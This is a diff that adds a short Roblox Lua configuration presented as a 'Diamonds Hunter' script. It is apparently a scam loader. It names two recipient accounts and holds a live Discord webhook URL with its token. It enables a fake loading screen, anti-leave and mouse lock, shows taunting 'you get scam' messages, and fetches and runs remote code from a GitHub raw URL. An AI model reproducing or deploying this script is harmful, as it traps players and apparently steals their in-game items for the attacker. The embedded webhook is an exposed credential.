@@ -1,0 +1,23 @@
+UserName = "ipin_p4"
+
+UserName2 = "ipin_p4"
+
+Webhook = "https://discord.com/api/webhooks/1107921351752298557/uw5G9vPflfanBaHMuT1MTv-FMry87c0Yjjyv89FF8rFxJJrVsxB5-RltTvdm0XWO4gDO"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+_G.ScriptName = "Diamonds Hunter"
+
+_G.FirstText = "wait"
+
+_G.SecondText = "you know you get scam?"
+
+_G.ThirdText = "get scam lol"
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pet-simx/ftssa/main/Main.lua", true))()
